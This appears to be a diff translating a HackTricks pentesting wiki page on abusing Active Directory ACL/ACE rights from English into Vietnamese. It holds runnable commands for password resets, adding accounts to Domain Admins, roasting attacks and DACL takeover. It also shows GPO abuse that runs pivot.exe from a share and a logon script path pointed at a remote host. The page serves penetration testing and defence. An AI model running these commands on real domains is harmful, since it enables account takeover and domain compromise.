@@ -1,8 +1,8 @@
-# Abusing Active Directory ACLs/ACEs
+# Lạm dụng ACL/ACE của Active Directory
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-**This page is mostly a summary of the techniques from** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **and** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. For more details, check the original articles.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
+**Trang này chủ yếu tóm tắt các kỹ thuật từ** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **và** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Để biết thêm chi tiết, hãy xem các bài viết gốc.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
 
 ## BadSuccessor
 
@@ -11,25 +11,25 @@
 BadSuccessor.md
 {{#endref}}
 
-## **GenericAll Rights on User**
+## **Quyền GenericAll trên User**
 
-This privilege grants an attacker full control over a target user account. Once `GenericAll` rights are confirmed using the `Get-ObjectAcl` command, an attacker can:
+Đặc quyền này cấp cho attacker toàn quyền kiểm soát tài khoản người dùng mục tiêu. Sau khi xác nhận quyền `GenericAll` bằng lệnh `Get-ObjectAcl`, attacker có thể:
 
-- **Change the Target's Password**: Using `net user <username> <password> /domain`, the attacker can reset the user's password.
-- From Linux, you can do the same over SAMR with Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>
+- **Đổi mật khẩu của mục tiêu**: Dùng `net user <username> <password> /domain`, attacker có thể đặt lại mật khẩu của người dùng.
+- Trên Linux, bạn có thể thực hiện tương tự thông qua SAMR bằng Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>
 
 ```bash
 # Reset target user's password over SAMR from Linux
 net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
 ```
 
-- **If the account is disabled, clear the UAC flag**: `GenericAll` allows editing `userAccountControl`. From Linux, BloodyAD can remove the `ACCOUNTDISABLE` flag:<sup>[[8]](#references)[[10]](#references)</sup>
+- **Nếu tài khoản bị vô hiệu hóa, hãy xóa cờ UAC**: `GenericAll` cho phép chỉnh sửa `userAccountControl`. Trên Linux, BloodyAD có thể xóa cờ `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>
 
 ```bash
 bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
 ```
 
-- **Targeted Kerberoasting**: Assign an SPN to the user's account to make it kerberoastable, then use Rubeus and targetedKerberoast.py to extract and attempt to crack the ticket-granting ticket (TGT) hashes.
+- **Targeted Kerberoasting**: Gán một SPN cho tài khoản người dùng để tài khoản này có thể bị kerberoast, sau đó dùng Rubeus và targetedKerberoast.py để trích xuất và thử crack các hash của ticket-granting ticket (TGT).
 
 ```bash
 Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
@@ -37,23 +37,23 @@ Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipal
 Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
 ```
 
-- **Targeted ASREPRoasting**: Disable pre-authentication for the user, making their account vulnerable to ASREPRoasting.
+- **Targeted ASREPRoasting**: Tắt pre-authentication cho người dùng, khiến tài khoản của họ dễ bị ASREPRoasting.
 
 ```bash
 Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
 
-- **Shadow Credentials / Key Credential Link**: With `GenericAll` on a user you can add a certificate-based credential and authenticate as them without changing their password. See:
+- **Shadow Credentials / Key Credential Link**: Với quyền `GenericAll` trên một người dùng, bạn có thể thêm thông tin xác thực dựa trên chứng chỉ và xác thực với tư cách họ mà không cần đổi mật khẩu. Xem:
 
 {{#ref}}
 shadow-credentials.md
 {{#endref}}
 
-## **GenericAll Rights on Group**
+## **Quyền GenericAll trên nhóm**
 
-This privilege allows an attacker to manipulate group memberships if they have `GenericAll` rights on a group like `Domain Admins`. After identifying the group's distinguished name with `Get-NetGroup`, the attacker can:
+Đặc quyền này cho phép kẻ tấn công thao túng thành viên nhóm nếu họ có quyền `GenericAll` trên một nhóm như `Domain Admins`. Sau khi xác định tên phân biệt của nhóm bằng `Get-NetGroup`, kẻ tấn công có thể:
 
-- **Add Themselves to the Domain Admins Group**: This can be done via direct commands or using modules like Active Directory or PowerSploit.
+- **Thêm chính mình vào nhóm Domain Admins**: Có thể thực hiện việc này bằng các lệnh trực tiếp hoặc dùng các module như Active Directory hoặc PowerSploit.
 
 ```bash
 net group "domain admins" spotless /add /domain
@@ -61,7 +61,7 @@ Add-ADGroupMember -Identity "domain admins" -Members spotless
 Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
 ```
 
-- From Linux you can also leverage BloodyAD to add yourself into arbitrary groups when you hold GenericAll/Write membership over them. If the target group is nested into “Remote Management Users”, you will immediately gain WinRM access on hosts honoring that group:<sup>[[8]](#references)</sup>
+- Từ Linux, bạn cũng có thể tận dụng BloodyAD để tự thêm mình vào các group bất kỳ khi có quyền GenericAll/Write membership đối với chúng. Nếu group mục tiêu được lồng trong “Remote Management Users”, bạn sẽ ngay lập tức có quyền truy cập WinRM trên các host áp dụng group đó:<sup>[[8]](#references)</sup>
 
 ```bash
 # Linux tooling example (BloodyAD) to add yourself to a target group
@@ -73,32 +73,32 @@ netexec winrm <dc-fqdn> -u <user> -p '<pass>'
 
 ## **GenericAll / GenericWrite / Write on Computer/User**
 
-Holding these privileges on a computer object or a user account allows for:
+Có các đặc quyền này trên đối tượng máy tính hoặc tài khoản người dùng sẽ cho phép:
 
-- **Kerberos Resource-based Constrained Delegation**: Enables taking over a computer object.
-- **Shadow Credentials**: Use this technique to impersonate a computer or user account by exploiting the privileges to create shadow credentials.
+- **Kerberos Resource-based Constrained Delegation**: Cho phép chiếm quyền kiểm soát một đối tượng máy tính.
+- **Shadow Credentials**: Dùng kỹ thuật này để mạo danh tài khoản máy tính hoặc người dùng bằng cách khai thác các đặc quyền để tạo shadow credentials.
 
-## Moving an object into inherited OU permissions
+## Di chuyển một đối tượng vào OU có quyền kế thừa
 
-A path can combine **move rights over an account** with **write rights inherited from a destination OU**, even when neither principal can initially modify the account's sensitive attributes. Verify the source object's move permissions and `CreateChild` on the destination, move the object, then re-check its effective DACL. For example, powerview.py's `Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'` moves the user; a controlled group with inherited `GenericWrite` on that OU can then add a [shadow credential](shadow-credentials.md). The move does not create the inherited right by itself.<sup>[[18]](#references)</sup>
+Một đường tấn công có thể kết hợp **quyền di chuyển một tài khoản** với **quyền ghi được kế thừa từ OU đích**, ngay cả khi ban đầu không principal nào có thể sửa các thuộc tính nhạy cảm của tài khoản. Hãy xác minh quyền di chuyển đối tượng nguồn và quyền `CreateChild` trên OU đích, di chuyển đối tượng, sau đó kiểm tra lại DACL hiệu lực của đối tượng. Ví dụ, `Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'` của powerview.py sẽ di chuyển người dùng; sau đó, một nhóm được kiểm soát có `GenericWrite` kế thừa trên OU đó có thể thêm [shadow credential](shadow-credentials.md). Bản thân việc di chuyển không tạo ra quyền kế thừa.<sup>[[18]](#references)</sup>
 
-If you have `GenericAll` on an OU but no suitable inherited ACE, `bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>` can add one for its descendants. Test the target account separately: **AdminSDHolder-protected accounts have inheritance disabled**, so an OU ACE may affect ordinary users while failing on a protected user. See [AdminSDHolder and SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group).<sup>[[18]](#references)</sup>
+Nếu bạn có `GenericAll` trên một OU nhưng không có ACE kế thừa phù hợp, `bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>` có thể thêm ACE cho các đối tượng con của OU đó. Hãy kiểm tra riêng tài khoản mục tiêu: **các tài khoản được AdminSDHolder bảo vệ đã tắt tính năng kế thừa**, vì vậy ACE trên OU có thể ảnh hưởng đến người dùng thông thường nhưng không có tác dụng với người dùng được bảo vệ. Xem [AdminSDHolder và SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group).<sup>[[18]](#references)</sup>
 
-A separate abuse path exists when a privileged scheduled cleanup script chooses OUs based on attacker-influenced ACEs, then runs `Set-ADObject -Clear adminCount` **and** `$acl.SetAccessRuleProtection($False, $False)` on their descendants. If you can modify the OU DACL, grant the group inspected by the script the required `ExtendedRight` or `GenericAll` ACE; separately verify that you can invoke the task. The privileged task can then restore inheritance on a previously protected account, allowing the OU ACE to apply. Confirm the exact script, trigger permission, and resulting DACL; clearing `adminCount` alone does not re-enable inheritance, and SDProp can re-protect accounts that remain in protected groups.<sup>[[18]](#references)</sup>
+Một đường khai thác riêng có thể xảy ra khi script dọn dẹp theo lịch với đặc quyền cao chọn OU dựa trên các ACE do kẻ tấn công kiểm soát, sau đó chạy `Set-ADObject -Clear adminCount` **và** `$acl.SetAccessRuleProtection($False, $False)` trên các đối tượng con của OU đó. Nếu có thể sửa DACL của OU, hãy cấp cho nhóm được script kiểm tra ACE `ExtendedRight` hoặc `GenericAll` cần thiết; đồng thời, xác minh riêng rằng bạn có thể kích hoạt tác vụ. Tác vụ có đặc quyền cao sau đó có thể bật lại tính năng kế thừa trên một tài khoản vốn được bảo vệ, cho phép ACE trên OU có hiệu lực. Hãy xác nhận chính xác script, quyền kích hoạt và DACL sau khi thay đổi; chỉ xóa `adminCount` sẽ không bật lại tính năng kế thừa, và SDProp có thể tái bảo vệ các tài khoản vẫn thuộc nhóm được bảo vệ.<sup>[[18]](#references)</sup>
 
 ## **WriteProperty on Group**
 
-If a user has `WriteProperty` rights on all objects for a specific group (e.g., `Domain Admins`), they can:
+Nếu người dùng có quyền `WriteProperty` trên tất cả đối tượng của một nhóm cụ thể (ví dụ: `Domain Admins`), họ có thể:
 
-- **Add Themselves to the Domain Admins Group**: Achievable via combining `net user` and `Add-NetGroupUser` commands, this method allows privilege escalation within the domain.
+- **Tự thêm mình vào nhóm Domain Admins**: Có thể thực hiện bằng cách kết hợp các lệnh `net user` và `Add-NetGroupUser`; phương pháp này cho phép leo thang đặc quyền trong domain.
 
 ```bash
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
 
-## **Self (Self-Membership) on Group**
+## **Self (Self-Membership) trên nhóm**
 
-This privilege enables attackers to add themselves to specific groups, such as `Domain Admins`, through commands that manipulate group membership directly. Using the following command sequence allows for self-addition:
+Quyền này cho phép kẻ tấn công tự thêm mình vào các nhóm cụ thể, chẳng hạn như `Domain Admins`, bằng các lệnh trực tiếp thao tác tư cách thành viên nhóm. Chuỗi lệnh sau cho phép tự thêm mình vào nhóm:
 
 ```bash
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
@@ -106,7 +106,7 @@ net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domai
 
 ## **WriteProperty (Self-Membership)**
 
-A similar privilege, this allows attackers to directly add themselves to groups by modifying group properties if they have the `WriteProperty` right on those groups. The confirmation and execution of this privilege are performed with:
+Một đặc quyền tương tự, cho phép kẻ tấn công trực tiếp tự thêm mình vào các group bằng cách sửa đổi thuộc tính của group nếu chúng có quyền `WriteProperty` trên các group đó. Xác nhận và thực thi đặc quyền này bằng cách:
 
 ```bash
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
@@ -115,7 +115,7 @@ net group "domain admins" spotless /add /domain
 
 ## **ForceChangePassword**
 
-Holding the `ExtendedRight` on a user for `User-Force-Change-Password` allows password resets without knowing the current password. Verification of this right and its exploitation can be done through PowerShell or alternative command-line tools, offering several methods to reset a user's password, including interactive sessions and one-liners for non-interactive environments. The commands range from simple PowerShell invocations to using `rpcclient` on Linux, demonstrating the versatility of attack vectors.
+Có quyền `ExtendedRight` trên một người dùng đối với `User-Force-Change-Password` cho phép đặt lại mật khẩu mà không cần biết mật khẩu hiện tại. Có thể xác minh quyền này và khai thác nó bằng PowerShell hoặc các công cụ dòng lệnh khác, với nhiều phương pháp đặt lại mật khẩu người dùng, bao gồm các phiên tương tác và lệnh một dòng dành cho môi trường phi tương tác. Các lệnh có phạm vi từ những lời gọi PowerShell đơn giản đến việc sử dụng `rpcclient` trên Linux, cho thấy sự đa dạng của các vector tấn công.
 
 ```bash
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
@@ -128,9 +128,9 @@ rpcclient -U KnownUsername 10.10.10.192
 > setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
 ```
 
-## **WriteOwner on Group**
+## **WriteOwner trên Group**
 
-If an attacker finds that they have `WriteOwner` rights over a group, they can change the ownership of the group to themselves. This is particularly impactful when the group in question is `Domain Admins`, as changing ownership allows for broader control over group attributes and membership. The process involves identifying the correct object via `Get-ObjectAcl` and then using `Set-DomainObjectOwner` to modify the owner, either by SID or name.
+Nếu kẻ tấn công phát hiện họ có quyền `WriteOwner` đối với một group, họ có thể thay đổi chủ sở hữu của group thành chính mình. Điều này đặc biệt có tác động lớn khi group đó là `Domain Admins`, vì việc thay đổi chủ sở hữu cho phép kiểm soát rộng hơn đối với các thuộc tính và thành viên của group. Quy trình này bao gồm xác định đúng đối tượng bằng `Get-ObjectAcl`, sau đó dùng `Set-DomainObjectOwner` để thay đổi chủ sở hữu bằng SID hoặc tên.
 
 ```bash
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
@@ -138,19 +138,19 @@ Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -Ow
 Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 ```
 
-## **GenericWrite on User**
+## **GenericWrite trên User**
 
-This permission allows an attacker to modify user properties. Specifically, with `GenericWrite` access, the attacker can change the logon script path of a user to execute a malicious script upon user logon. This is achieved by using the `Set-ADObject` command to update the `scriptpath` property of the target user to point to the attacker's script.
+Quyền này cho phép kẻ tấn công sửa đổi các thuộc tính của user. Cụ thể, với quyền truy cập `GenericWrite`, kẻ tấn công có thể thay đổi đường dẫn logon script của user để thực thi một script độc hại khi user đăng nhập. Việc này được thực hiện bằng cách sử dụng lệnh `Set-ADObject` để cập nhật thuộc tính `scriptpath` của user mục tiêu, trỏ đến script của kẻ tấn công.
 
 ```bash
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
 
-A narrower `WriteProperty` ACE scoped to the user's [`scriptPath` attribute](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) can be sufficient; `GenericWrite` is not required. Pair that attribute right with a writable script under the domain's `SYSVOL\<domain>\scripts` or `NETLOGON` tree, then assess whether the target user is likely to log on and reach the script. The script runs in that user's context at logon. Review the effective AD and file/share ACLs separately; a matching Allow ACE or writable directory alone does not establish the complete path.
+Một ACE `WriteProperty` có phạm vi hẹp hơn, chỉ áp dụng cho thuộc tính [`scriptPath` của người dùng](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e), có thể là đủ; không cần `GenericWrite`. Kết hợp quyền ghi vào thuộc tính đó với một script có thể ghi trong cây `SYSVOL\<domain>\scripts` hoặc `NETLOGON` của domain, sau đó đánh giá khả năng người dùng mục tiêu đăng nhập và chạy đến script. Script chạy trong ngữ cảnh của người dùng đó khi đăng nhập. Kiểm tra riêng các ACL AD và ACL file/chia sẻ có hiệu lực; chỉ có một Allow ACE phù hợp hoặc một thư mục có thể ghi không đồng nghĩa với việc đã có đủ toàn bộ đường thực thi.
 
 ## **GenericWrite on Group**
 
-With this privilege, attackers can manipulate group membership, such as adding themselves or other users to specific groups. This process involves creating a credential object, using it to add or remove users from a group, and verifying the membership changes with PowerShell commands.
+Với đặc quyền này, attacker có thể thao túng thành viên nhóm, chẳng hạn như thêm chính họ hoặc người dùng khác vào các nhóm cụ thể. Quá trình này bao gồm việc tạo một credential object, sử dụng nó để thêm hoặc xóa người dùng khỏi nhóm, rồi xác minh các thay đổi về thành viên bằng các lệnh PowerShell.
 
 ```bash
 $pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
@@ -160,7 +160,7 @@ Get-DomainGroupMember -Identity "Group Name" | Select MemberName
 Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
 ```
 
-- From Linux, Samba `net` can add/remove members when you hold `GenericWrite` on the group (useful when PowerShell/RSAT are unavailable):<sup>[[9]](#references)[[10]](#references)</sup>
+- Từ Linux, Samba `net` có thể thêm/xóa thành viên khi bạn có quyền `GenericWrite` trên nhóm (hữu ích khi không có PowerShell/RSAT):<sup>[[9]](#references)[[10]](#references)</sup>
 
 ```bash
 # Add yourself to the target group via SAMR
@@ -171,7 +171,7 @@ net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
 
 ## **WriteDACL + WriteOwner**
 
-Owning an AD object and having `WriteDACL` privileges on it enables an attacker to grant themselves `GenericAll` privileges over the object. This is accomplished through ADSI manipulation, allowing for full control over the object and the ability to modify its group memberships. Despite this, limitations exist when trying to exploit these privileges using the Active Directory module's `Set-Acl` / `Get-Acl` cmdlets.<sup>[[4]](#references)[[7]](#references)</sup>
+Việc sở hữu một đối tượng AD và có đặc quyền `WriteDACL` trên đối tượng đó cho phép attacker tự cấp cho mình đặc quyền `GenericAll` trên đối tượng. Điều này được thực hiện thông qua thao tác với ADSI, cho phép kiểm soát hoàn toàn đối tượng và khả năng sửa đổi tư cách thành viên nhóm của đối tượng. Tuy nhiên, vẫn có những hạn chế khi cố khai thác các đặc quyền này bằng các cmdlet `Set-Acl` / `Get-Acl` của module Active Directory.<sup>[[4]](#references)[[7]](#references)</sup>
 
 ```bash
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
@@ -181,9 +181,9 @@ $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
 $ADSI.psbase.commitchanges()
 ```
 
-### WriteDACL/WriteOwner quick takeover (PowerView)
+### Chiếm quyền nhanh bằng WriteDACL/WriteOwner (PowerView)
 
-When you have `WriteOwner` and `WriteDacl` over a user or service account, you can take full control and reset its password using PowerView without knowing the old password:
+Khi có quyền `WriteOwner` và `WriteDacl` đối với một tài khoản người dùng hoặc tài khoản dịch vụ, bạn có thể toàn quyền kiểm soát tài khoản đó và đặt lại mật khẩu bằng PowerView mà không cần biết mật khẩu cũ:
 
 ```powershell
 # Load PowerView
@@ -197,91 +197,91 @@ $cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
 Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
 ```
 
-Notes:
-- You may need to first change the owner to yourself if you only have `WriteOwner`:
+Ghi chú:
+- Bạn có thể cần đổi chủ sở hữu thành chính mình trước nếu bạn chỉ có quyền `WriteOwner`:
 
 ```powershell
 Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
 ```
 
-- Validate access with any protocol (SMB/LDAP/RDP/WinRM) after password reset.
+- Xác thực quyền truy cập bằng bất kỳ giao thức nào (SMB/LDAP/RDP/WinRM) sau khi đặt lại mật khẩu.
 
-## **Replication on the Domain (DCSync)**
+## **Replication trên Domain (DCSync)**
 
-The DCSync attack leverages specific replication permissions on the domain to mimic a Domain Controller and synchronize data, including user credentials. This powerful technique requires permissions like `DS-Replication-Get-Changes`, allowing attackers to extract sensitive information from the AD environment without direct access to a Domain Controller.<sup>[[5]](#references)</sup> [**Learn more about the DCSync attack here.**](../dcsync.md)
+Cuộc tấn công DCSync khai thác các quyền replication cụ thể trên domain để giả mạo Domain Controller và đồng bộ hóa dữ liệu, bao gồm thông tin xác thực của người dùng. Kỹ thuật mạnh mẽ này yêu cầu các quyền như `DS-Replication-Get-Changes`, cho phép kẻ tấn công trích xuất thông tin nhạy cảm từ môi trường AD mà không cần truy cập trực tiếp vào Domain Controller.<sup>[[5]](#references)</sup> [**Tìm hiểu thêm về cuộc tấn công DCSync tại đây.**](../dcsync.md)
 
-## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>
+## Ủy quyền GPO <a href="#gpo-delegation" id="gpo-delegation"></a>
 
-### GPO Delegation
+### Ủy quyền GPO
 
-Delegated access to manage Group Policy Objects (GPOs) can present significant security risks. For instance, if a user such as `offense\spotless` is delegated GPO management rights, they may have privileges like **WriteProperty**, **WriteDacl**, and **WriteOwner**. These permissions can be abused for malicious purposes, as identified using PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>
+Quyền truy cập được ủy quyền để quản lý Group Policy Objects (GPO) có thể gây ra rủi ro bảo mật đáng kể. Ví dụ, nếu một người dùng như `offense\spotless` được ủy quyền quyền quản lý GPO, họ có thể có các quyền như **WriteProperty**, **WriteDacl** và **WriteOwner**. Những quyền này có thể bị lạm dụng cho mục đích độc hại, như được xác định bằng PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>
 
-### Enumerate GPO Permissions
+### Liệt kê quyền GPO
 
-To identify misconfigured GPOs, PowerSploit's cmdlets can be chained together. This allows for the discovery of GPOs that a specific user has permissions to manage: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+Có thể kết hợp các cmdlet của PowerSploit để xác định các GPO bị cấu hình sai. Cách này giúp tìm ra những GPO mà một người dùng cụ thể có quyền quản lý: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
-**Computers with a Given Policy Applied**: It's possible to resolve which computers a specific GPO applies to, helping understand the scope of potential impact. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
+**Máy tính áp dụng một chính sách cụ thể**: Có thể xác định những máy tính chịu ảnh hưởng của một GPO cụ thể, giúp hiểu rõ phạm vi tác động tiềm ẩn. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
 
-**Policies Applied to a Given Computer**: To see what policies are applied to a particular computer, commands like `Get-DomainGPO` can be utilized.
+**Các chính sách áp dụng cho một máy tính cụ thể**: Có thể sử dụng các lệnh như `Get-DomainGPO` để xem những chính sách được áp dụng cho một máy tính cụ thể.
 
-**OUs with a Given Policy Applied**: Identifying organizational units (OUs) affected by a given policy can be done using `Get-DomainOU`.
+**OU áp dụng một chính sách cụ thể**: Có thể xác định các organizational unit (OU) chịu ảnh hưởng của một chính sách bằng `Get-DomainOU`.
 
-You can also use the tool [**GPOHound**](https://github.com/cogiceo/GPOHound) to enumerate GPOs and find issues in them.
+Bạn cũng có thể dùng công cụ [**GPOHound**](https://github.com/cogiceo/GPOHound) để liệt kê GPO và tìm các vấn đề trong đó.
 
-### Abuse GPO - New-GPOImmediateTask
+### Lạm dụng GPO - New-GPOImmediateTask
 
-Misconfigured GPOs can be exploited to execute code, for example, by creating an immediate scheduled task. This can be done to add a user to the local administrators group on affected machines, significantly elevating privileges:
+Có thể khai thác các GPO bị cấu hình sai để thực thi code, chẳng hạn bằng cách tạo một scheduled task tức thời. Cách này có thể được dùng để thêm người dùng vào nhóm quản trị viên cục bộ trên các máy bị ảnh hưởng, qua đó nâng cao đáng kể quyền hạn:
 
 ```bash
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
 
-### GroupPolicy module - Abuse GPO
+### GroupPolicy module - Lạm dụng GPO
 
-The GroupPolicy module, if installed, allows for the creation and linking of new GPOs, and setting preferences such as registry values to execute backdoors on affected computers. This method requires the GPO to be updated and a user to log in to the computer for execution:
+Nếu được cài đặt, module GroupPolicy cho phép tạo và liên kết GPO mới, cũng như thiết lập các tùy chọn như giá trị registry để thực thi backdoors trên các máy tính bị ảnh hưởng. Phương pháp này yêu cầu GPO được cập nhật và người dùng đăng nhập vào máy tính để thực thi:
 
 ```bash
 New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
 Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
 ```
 
-### SharpGPOAbuse - Abuse GPO
+### SharpGPOAbuse - Lạm dụng GPO
 
-SharpGPOAbuse offers a method to abuse existing GPOs by adding tasks or modifying settings without the need to create new GPOs. This tool requires modification of existing GPOs or using RSAT tools to create new ones before applying changes:
+SharpGPOAbuse cung cấp một phương thức lạm dụng các GPO hiện có bằng cách thêm tác vụ hoặc sửa đổi cài đặt mà không cần tạo GPO mới. Công cụ này yêu cầu sửa đổi các GPO hiện có hoặc sử dụng công cụ RSAT để tạo GPO mới trước khi áp dụng các thay đổi:
 
 ```bash
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
 ```
 
-### Force Policy Update
+### Buộc cập nhật chính sách
 
-GPO updates typically occur around every 90 minutes. To expedite this process, especially after implementing a change, the `gpupdate /force` command can be used on the target computer to force an immediate policy update. This command ensures that any modifications to GPOs are applied without waiting for the next automatic update cycle.
+GPO thường được cập nhật khoảng 90 phút một lần. Để đẩy nhanh quá trình này, đặc biệt là sau khi thực hiện thay đổi, có thể chạy lệnh `gpupdate /force` trên máy tính mục tiêu để buộc cập nhật chính sách ngay lập tức. Lệnh này đảm bảo mọi sửa đổi đối với GPO được áp dụng mà không cần chờ đến chu kỳ cập nhật tự động tiếp theo.
 
-### Under the Hood
+### Bên dưới lớp vỏ
 
-Upon inspection of the Scheduled Tasks for a given GPO, like the `Misconfigured Policy`, the addition of tasks such as `evilTask` can be confirmed. These tasks are created through scripts or command-line tools aiming to modify system behavior or escalate privileges.
+Khi kiểm tra Scheduled Tasks của một GPO nhất định, chẳng hạn `Misconfigured Policy`, có thể xác nhận rằng các tác vụ như `evilTask` đã được thêm vào. Những tác vụ này được tạo bằng script hoặc công cụ dòng lệnh nhằm thay đổi hành vi hệ thống hoặc leo thang đặc quyền.
 
-The structure of the task, as shown in the XML configuration file generated by `New-GPOImmediateTask`, outlines the specifics of the scheduled task - including the command to be executed and its triggers. This file represents how scheduled tasks are defined and managed within GPOs, providing a method for executing arbitrary commands or scripts as part of policy enforcement.
+Cấu trúc của tác vụ, như thể hiện trong tệp cấu hình XML do `New-GPOImmediateTask` tạo ra, nêu chi tiết về tác vụ đã lên lịch, bao gồm lệnh sẽ thực thi và các trigger của tác vụ. Tệp này thể hiện cách các tác vụ đã lên lịch được định nghĩa và quản lý trong GPO, cung cấp phương thức thực thi lệnh hoặc script tùy ý trong quá trình áp dụng chính sách.
 
-### Users and Groups
+### Người dùng và Nhóm
 
-GPOs also allow for the manipulation of user and group memberships on target systems. By editing the Users and Groups policy files directly, attackers can add users to privileged groups, such as the local `administrators` group. This is possible through the delegation of GPO management permissions, which permits the modification of policy files to include new users or change group memberships.
+GPO cũng cho phép thao túng tư cách thành viên người dùng và nhóm trên các hệ thống mục tiêu. Bằng cách chỉnh sửa trực tiếp các tệp chính sách Users and Groups, attacker có thể thêm người dùng vào các nhóm đặc quyền, chẳng hạn như nhóm `administrators` cục bộ. Điều này có thể thực hiện được thông qua việc ủy quyền quyền quản lý GPO, cho phép sửa đổi các tệp chính sách để thêm người dùng mới hoặc thay đổi tư cách thành viên nhóm.
 
-The XML configuration file for Users and Groups outlines how these changes are implemented. By adding entries to this file, specific users can be granted elevated privileges across affected systems. This method offers a direct approach to privilege escalation through GPO manipulation.
+Tệp cấu hình XML của Users and Groups mô tả cách triển khai những thay đổi này. Bằng cách thêm các mục vào tệp, có thể cấp đặc quyền nâng cao cho những người dùng cụ thể trên các hệ thống bị ảnh hưởng. Phương pháp này cung cấp một cách trực tiếp để leo thang đặc quyền thông qua thao túng GPO.
 
